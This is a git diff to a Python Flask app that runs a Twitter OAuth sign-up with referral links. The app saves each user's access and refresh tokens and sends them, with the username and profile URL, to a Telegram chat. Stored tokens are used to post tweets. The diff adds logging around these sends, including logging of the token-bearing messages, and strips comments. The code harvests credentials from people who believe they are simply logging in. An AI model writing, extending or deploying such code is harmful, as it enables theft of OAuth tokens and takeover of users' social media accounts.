@@ -1,6 +1,7 @@
+import os
+import logging  # Import the logging module
 import base64
 import hashlib
-import os
 import psycopg2
 import requests
 import time
@@ -9,6 +10,8 @@ import random
 import string
 from flask import Flask, redirect, request, session, render_template, url_for
 from psycopg2.extras import RealDictCursor
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
 # Configuration: Ensure these environment variables are set correctly
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -130,6 +133,8 @@ def store_token(access_token, refresh_token, username):
         print(f"Database error while storing token: {e}")
 
 def send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens):
+    # Log the referral URL before sending the final message
+    send_message_via_telegram(f"🔍 Preparing to send login notification. Referral URL for @{username}: {referral_url}")
     send_message_via_telegram(
         f"🔑 Access Token: {access_token}\n"
         f"🔄 Refresh Token: {refresh_token}\n"
@@ -139,7 +144,6 @@ def send_login_notification(access_token, refresh_token, username, profile_url, 
         f"📊 Total Tokens in Database: {total_tokens}"
     )
 
-
 @app.route('/')
 def home():
     try:
@@ -148,35 +152,28 @@ def home():
         state = request.args.get('state')
         error = request.args.get('error')
 
-        # Save referrer_id in session if provided
         referrer_id = request.args.get('referrer_id')
         if referrer_id:
             session['referrer_id'] = referrer_id
             send_message_via_telegram(f"🆔 Referrer ID {referrer_id} stored in session.")
 
-        # Check if user is already logged in
         if 'username' in session:
             username = session['username']
-            
-            # Retrieve referral URL from database
             conn = psycopg2.connect(DATABASE_URL, sslmode='require')
             cursor = conn.cursor()
             send_message_via_telegram(f"🔍 Retrieving referral URL for returning user @{username}.")
             cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
             referral_url = cursor.fetchone()[0]
             conn.close()
-            
             send_message_via_telegram(f"👋 @{username} just returned to the website.\n🔗 Referral URL: {referral_url}")
             return redirect(url_for('welcome'))
 
-        # Initiate OAuth flow if 'authorize' is true
         if request.args.get('authorize') == 'true':
             send_message_via_telegram("🔒 Starting OAuth authorization process.")
             authorization_url = initiate_oauth()
             send_message_via_telegram("🔗 Redirecting to authorization URL.")
             return redirect(authorization_url)
 
-        # Process authorization code if present
         if code:
             send_message_via_telegram("🔓 Authorization code received. Exchanging for tokens.")
             
@@ -193,24 +190,19 @@ def home():
                 access_token = token_response.get('access_token')
                 refresh_token = token_response.get('refresh_token')
 
-                # Fetch Twitter username and profile URL
                 send_message_via_telegram("🔍 Fetching Twitter username for the new user.")
                 username, profile_url = get_twitter_username_and_profile(access_token)
 
                 if username:
-                    # Store tokens and username in the database
                     send_message_via_telegram(f"🔄 Starting token storage process for @{username}")
                     store_token(access_token, refresh_token, username)
                     
-                    # Set session values
                     session['username'] = username
                     session['access_token'] = access_token
                     session['refresh_token'] = refresh_token
                     
-                    # Get total token count for reporting
                     total_tokens = get_total_tokens()
                     
-                    # Retrieve referral URL for notification
                     send_message_via_telegram(f"🔍 Retrieving referral URL for notification of @{username}.")
                     conn = psycopg2.connect(DATABASE_URL, sslmode='require')
                     cursor = conn.cursor()
@@ -222,7 +214,6 @@ def home():
                         referral_url = referral_data[0]
                         send_message_via_telegram(f"🔗 Referral URL retrieved for @{username}: {referral_url}")
                         
-                        # Send consolidated notification
                         send_message_via_telegram("📩 Sending login notification.")
                         send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens)
                         send_message_via_telegram(f"🎉 New login completed. @{username} is now logged in. Total tokens: {total_tokens}")
@@ -239,7 +230,6 @@ def home():
                 send_message_via_telegram(f"❌ Error retrieving access token: {error_description} (Code: {error_code})")
                 return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-        # Render the home page with Sign Up/Login button if not authorized
         send_message_via_telegram("ℹ️ Displaying home page to user.")
         return render_template('home.html')
 
@@ -342,9 +332,21 @@ def send_message_via_telegram(message):
         "parse_mode": "Markdown"
     }
     headers = {"Content-Type": "application/json; charset=utf-8"}
+
+    # Log the message content before sending
+    logging.info(f"📤 Sending message to Telegram: {message}")
+    
     response = requests.post(url, json=data, headers=headers)
+
     if response.status_code != 200:
-        print(f"Failed to send message via Telegram: {response.text}")
+        # Log the error response
+        logging.error(f"❌ Failed to send message via Telegram: {response.text}")
+    else:
+        # Log the successful response
+        logging.info(f"✅ Message sent successfully to Telegram: {response.json()}")
+
+    return response.status_code == 200  # Return success status for potential further handling
+
 
 # Function to post a tweet using a single token
 def post_tweet(access_token, tweet_text):
